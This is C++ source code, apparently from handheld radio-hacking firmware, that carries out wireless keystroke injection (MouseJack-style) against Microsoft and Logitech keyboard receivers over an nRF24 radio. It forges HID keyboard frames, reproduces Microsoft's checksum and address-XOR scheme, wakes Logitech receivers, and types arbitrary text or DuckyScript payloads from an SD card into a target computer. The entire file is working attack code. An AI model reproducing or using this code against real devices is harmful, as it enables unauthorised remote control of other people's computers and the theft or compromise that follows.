void NRF24Screen::_transmitReliable(const uint8_t* frame, uint8_t len) {
  auto* r = _nrf.radio();
  if (!r) return;
  for (int i = 0; i < kMjRetransmits; i++) r->write(frame, len, true); // multicast: no ACK
}

// Microsoft frame checksum: XOR of all preceding bytes, inverted.
void NRF24Screen::_msChecksum(uint8_t* payload, uint8_t size) {
  uint8_t cksum = 0;
  for (uint8_t i = 0; i < size - 1; i++) cksum ^= payload[i];
  payload[size - 1] = ~cksum;
}

// Microsoft "encrypted" whitening: XOR the tail with the device address.
void NRF24Screen::_msCrypt(uint8_t* payload, uint8_t size, const uint8_t* addr) {
  for (uint8_t i = 4; i < size; i++) payload[i] ^= addr[(i - 4) % 5];
}

void NRF24Screen::_msTransmit(const MjTarget& t, uint8_t mod, uint8_t key) {
  uint8_t frame[19];
  memset(frame, 0, sizeof(frame));
  frame[0] = 0x08;
  frame[4] = (uint8_t)(_mjMsSeq & 0xFF);
  frame[5] = (uint8_t)((_mjMsSeq >> 8) & 0xFF);
  frame[6] = 0x43;
  frame[7] = mod;
  frame[9] = key;
  _mjMsSeq++;
  _msChecksum(frame, sizeof(frame));
  if (t.type == 2) _msCrypt(frame, sizeof(frame), t.addr);

  // Key-down
  _transmitReliable(frame, sizeof(frame));
  delay(5);

  // Key-up (null keystroke) with a fresh sequence number
  if (t.type == 2) _msCrypt(frame, sizeof(frame), t.addr);
  for (int n = 4; n < 18; n++) frame[n] = 0;
  frame[4] = (uint8_t)(_mjMsSeq & 0xFF);
  frame[5] = (uint8_t)((_mjMsSeq >> 8) & 0xFF);
  frame[6] = 0x43;
  _mjMsSeq++;
  _msChecksum(frame, sizeof(frame));
  if (t.type == 2) _msCrypt(frame, sizeof(frame), t.addr);
  _transmitReliable(frame, sizeof(frame));
  delay(5);
}

void NRF24Screen::_logTransmit(const MjTarget& t, uint8_t mod, const uint8_t* keys, uint8_t keysLen) {
  uint8_t frame[10];
  memset(frame, 0, sizeof(frame));
  frame[0] = 0x00;
  frame[1] = 0xC1;   // unencrypted HID keyboard frame
  frame[2] = mod;
  for (uint8_t i = 0; i < keysLen && i < 6; i++) frame[3 + i] = keys[i];

  // Two's-complement checksum
  uint8_t cksum = 0;
  for (uint8_t i = 0; i < 9; i++) cksum += frame[i];
  frame[9] = (uint8_t)(0x100 - cksum);

  _transmitReliable(frame, sizeof(frame));
}

// Nudge a sleeping Logitech receiver awake before injecting.
void NRF24Screen::_logitechWake(const MjTarget& t) {
  if (t.type != 3) return;
  uint8_t hello[10] = {0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED};
  _transmitReliable(hello, sizeof(hello));
  delay(12);
  uint8_t neutral = 0x00;
  _logTransmit(t, 0x00, &neutral, 1);
  delay(8);
}

void NRF24Screen::_sendKeystroke(const MjTarget& t, uint8_t mod, uint8_t key) {
  if (t.type == 3) {
    _logTransmit(t, mod, &key, 1);
    delay(kMjInterKeyMs);
    uint8_t none = 0x00;
    _logTransmit(t, 0x00, &none, 1);
  } else {
    _msTransmit(t, mod, key);
  }
}

void NRF24Screen::_typeString(const MjTarget& t, const char* text) {
  for (size_t i = 0; text[i] != '\0'; i++) {
    if (_mjAbort()) return;
    HidKey hk;
    char c = text[i];
    if (c == '\n')      { hk.mod = 0; hk.key = 0x28; }   // ENTER
    else if (c == '\t') { hk.mod = 0; hk.key = 0x2B; }   // TAB
    else if (!_asciiToHid(c, hk)) continue;
    _sendKeystroke(t, hk.mod, hk.key);
    delay(kMjInterKeyMs);
  }
}

// Parse one DuckyScript line and execute it against the target.
bool NRF24Screen::_parseDuckyLine(const String& line, const MjTarget& t) {
  if (line.startsWith("REM") || line.startsWith("//")) return true;

  if (line.startsWith("DELAY ") || line.startsWith("DELAY\t")) {
    int ms = line.substring(6).toInt();
    if (ms > 0 && ms <= 60000) delay(ms);
    return true;
  }
  if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) return true;
  if (line.startsWith("STRING ")) { _typeString(t, line.substring(7).c_str()); return true; }
  if (line.startsWith("STRINGLN ")) {
    _typeString(t, line.substring(9).c_str());
    _sendKeystroke(t, 0, 0x28);
    return true;
  }
  if (line.startsWith("REPEAT ")) return true;

  // Key names / modifier combos on a single line (e.g. "CTRL ALT DELETE").
  uint8_t mod = 0, key = 0;
  String rem = line;
  rem.trim();
  while (rem.length() > 0) {
    int sp = rem.indexOf(' ');
    String tok;
    if (sp > 0) { tok = rem.substring(0, sp); rem = rem.substring(sp + 1); rem.trim(); }
    else        { tok = rem; rem = ""; }

    if (tok.length() == 1) {
      HidKey hk;
      if (_asciiToHid(tok.charAt(0), hk)) { mod |= hk.mod; key = hk.key; }
      continue;
    }
    bool found = false;
    for (const auto& dk : kDuckyKeys) {
      if (tok.equalsIgnoreCase(dk.name)) {
        mod |= dk.mod;
        if (dk.key != 0) key = dk.key;
        found = true;
        break;
      }
    }
    if (!found) return false;
  }
  _sendKeystroke(t, mod, key);
  delay(kMjInterKeyMs);
  return true;
}

void NRF24Screen::_injectMjText(int targetIdx, const String& text) {
  if (targetIdx < 0 || targetIdx >= (int)_mjCount) return;
  MjTarget t = _mjTargets[targetIdx];
  auto* r = _nrf.radio();
  if (!r) return;

  _setupTxForTarget(t);
  _logitechWake(t);
  if (t.type == 1 || t.type == 2) {
    _mjMsSeq = 0;
    for (int i = 0; i < 6; i++) { _msTransmit(t, 0, 0); delay(2); }
  }

  _typeString(t, text.c_str());

  r->powerDown();
  ShowStatusAction::show("Injection complete");
  _setupMjScan();
}

void NRF24Screen::_injectMjDucky(int targetIdx, const String& path) {
  if (targetIdx < 0 || targetIdx >= (int)_mjCount) return;
  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
    ShowStatusAction::show("No storage");
    return;
  }
  MjTarget t = _mjTargets[targetIdx];
  auto* r = _nrf.radio();
  if (!r) return;

  fs::File file = Uni.Storage->open(path.c_str(), "r");
  if (!file) {
    ShowStatusAction::show("Cannot open file");
    return;
  }

  _setupTxForTarget(t);
  _logitechWake(t);
  if (t.type == 1 || t.type == 2) {
    _mjMsSeq = 0;
    for (int i = 0; i < 6; i++) { _msTransmit(t, 0, 0); delay(2); }
  }

  uint16_t defaultDelayMs = 0;
  String lastLine;
  while (file.available()) {
    if (_mjAbort()) break;
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() == 0) continue;

    if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
      defaultDelayMs = (uint16_t)line.substring(line.indexOf(' ') + 1).toInt();
      if (defaultDelayMs > 10000) defaultDelayMs = 10000;
      continue;
    }
    if (line.startsWith("REPEAT ")) {
      int reps = line.substring(7).toInt();
      if (reps < 1)   reps = 1;
      if (reps > 500) reps = 500;
      for (int rr = 0; rr < reps; rr++) {
        if (_mjAbort()) break;
        if (lastLine.length() > 0) _parseDuckyLine(lastLine, t);
      }
      continue;
    }

    _parseDuckyLine(line, t);
    lastLine = line;
    if (defaultDelayMs > 0) delay(defaultDelayMs);
  }

  file.close();
  r->powerDown();
  ShowStatusAction::show("Script complete");
  _setupMjScan();
}

// Present the DuckyScript files on the SD card and run the chosen one.
void NRF24Screen::_pickDuckyScript(int targetIdx) {
  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
    ShowStatusAction::show("No storage");
    return;
  }
  Uni.Storage->makeDir(kMjDuckyDir);

  static constexpr uint8_t kMax = 24;
  IStorage::DirEntry entries[kMax];
  uint8_t n = Uni.Storage->listDir(kMjDuckyDir, entries, kMax);

  String              names[kMax];   // backing storage for option strings
  InputSelectAction::Option opts[kMax];
  uint8_t optCount = 0;
  for (uint8_t i = 0; i < n && optCount < kMax; i++) {
    if (entries[i].isDir) continue;
    if (!entries[i].name.endsWith(".txt") && !entries[i].name.endsWith(".dd")) continue;
    names[optCount]      = entries[i].name;
    opts[optCount].label = names[optCount].c_str();
    opts[optCount].value = names[optCount].c_str();
    optCount++;
  }

  if (optCount == 0) {
    ShowStatusAction::show("No scripts in /unigeek/ducky");
    return;
  }

  const char* chosen = InputSelectAction::popup("Ducky Script", opts, optCount);
  if (!chosen) return;

  String path = String(kMjDuckyDir) + "/" + chosen;
  _injectMjDucky(targetIdx, path);
}